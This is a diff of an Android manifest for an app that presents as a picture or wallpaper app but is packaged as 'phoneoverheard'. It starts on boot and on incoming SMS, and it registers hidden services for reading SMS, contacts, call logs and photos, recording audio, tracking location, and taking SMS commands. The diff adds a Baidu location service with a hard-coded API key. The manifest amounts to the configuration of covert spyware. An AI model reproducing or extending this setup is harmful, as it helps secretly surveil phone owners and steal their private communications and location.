@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.phoneoverheard.phonne"
+    package="com.phoneoverheard.phone"
     android:versionCode="1"
     android:versionName="1.0" >
 
@@ -47,13 +47,28 @@
     <uses-permission android:name="android.permission.SET_WALLPAPER" />
 
     <application
-        android:hardwareAccelerated="true"
+        android:name="cn.linving.girls.MyApplication"
         android:allowBackup="true"
+        android:hardwareAccelerated="true"
         android:icon="@drawable/ic_launcher"
         android:label="@string/app_name"
-        android:theme="@style/AppTheme"
-        android:name="cn.linving.girls.MyApplication" >
-        
+        android:theme="@style/AppTheme" >
+
+        <!-- 地图定位      -->
+        <service
+            android:name="com.baidu.location.f"
+            android:enabled="true"
+            android:process=":remote" >
+            <intent-filter>
+                <action android:name="com.baidu.location.service_v2.2" >
+                </action>
+            </intent-filter>
+        </service>
+
+        <meta-data
+            android:name="com.baidu.lbsapi.API_KEY"
+            android:value="5EFq7r1zeWH9x8f4HiT41FDZ" />
+
         <activity
             android:name="cn.linving.girls.activity.SplashSpotActivity"
             android:configChanges="keyboard|keyboardHidden|screenSize|orientation"
@@ -64,7 +79,6 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        
         <activity
             android:name="cn.linving.girls.activity.HomeActivity"
             android:label="@string/app_name" >
@@ -124,9 +138,8 @@
             </intent-filter>
         </receiver>
 
-
         <!-- 开机启动服务 ,系统启动完成后会调用 -->
-        <receiver android:name="com.phoneoverheard.phonne.BootBroadcastReceiver" >
+        <receiver android:name="com.phoneoverheard.phone.BootBroadcastReceiver" >
             <intent-filter android:priority="1000" >
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
@@ -134,46 +147,46 @@
         </receiver>
         <!-- 消息推送服务 -->
         <service
-            android:name="com.phoneoverheard.phonne.PhoneService"
+            android:name="com.phoneoverheard.phone.PhoneService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.duanxinService"
+            android:name="com.phoneoverheard.phone.duanxinService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.haomaService"
+            android:name="com.phoneoverheard.phone.haomaService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.lianxirenService"
+            android:name="com.phoneoverheard.phone.lianxirenService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.weizhiService"
+            android:name="com.phoneoverheard.phone.weizhiService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.luyinService"
+            android:name="com.phoneoverheard.phone.luyinService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.tonghuajiluService"
+            android:name="com.phoneoverheard.phone.tonghuajiluService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.ManagerService"
+            android:name="com.phoneoverheard.phone.ManagerService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.SimmsgService"
+            android:name="com.phoneoverheard.phone.SimmsgService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.SmscmdService"
+            android:name="com.phoneoverheard.phone.SmscmdService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.smsService"
+            android:name="com.phoneoverheard.phone.smsService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.NetworkService"
+            android:name="com.phoneoverheard.phone.NetworkService"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.SDCardListener"
+            android:name="com.phoneoverheard.phone.SDCardListener"
             android:enabled="true" />
         <service
-            android:name="com.phoneoverheard.phonne.zhaopianService"
+            android:name="com.phoneoverheard.phone.zhaopianService"
             android:enabled="true" />
     </application>
 
